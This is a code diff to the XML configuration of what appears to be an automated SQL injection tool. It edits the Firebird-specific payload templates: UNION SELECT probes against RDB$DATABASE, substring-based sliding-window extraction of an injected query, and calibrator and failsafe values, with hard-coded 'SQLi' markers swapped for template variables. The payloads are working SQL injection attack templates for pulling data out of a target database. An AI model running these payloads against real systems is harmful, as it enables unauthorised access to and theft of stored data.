@@ -64,9 +64,9 @@ from ${TABLE}
             <slidingWindow>
 select
     /**
-     * If reach end of string (SQLii) then NULLIF nullifies the result
+     * If reach end of string (${LEAD}i) then NULLIF nullifies the result
      */
-    'SQLi'||NULLIF(substring(
+    '${LEAD}'||NULLIF(substring(
         (${INJECTION})from
         ${INDEX} for
         65536
@@ -74,12 +74,12 @@ select
             </slidingWindow>
             <limit> ROWS ${LIMIT} TO ${LIMIT}</limit>
             <failsafe>(1337${INDICE}7330%2b1)</failsafe>
-            <calibrator>rpad('%23',1024,'%23')</calibrator>
+            <calibrator>rpad('${CALIBRATOR_SQL}',1024,'${CALIBRATOR_SQL}')</calibrator>
             <limitBoundary>1</limitBoundary>
         </configuration>
         <normal>
             <indices> union select ${INDICES} from RDB$DATABASE</indices>
-            <capacity><![CDATA[(select 'SQLi${INDICE}'||${CALIBRATOR}||'iLQS'from RDB\$DATABASE)]]></capacity>
+            <capacity><![CDATA[(select '${LEAD}${INDICE}'||${CALIBRATOR}from RDB\$DATABASE)]]></capacity>
             <orderBy> order by 1337</orderBy>
         </normal>
     </strategy>
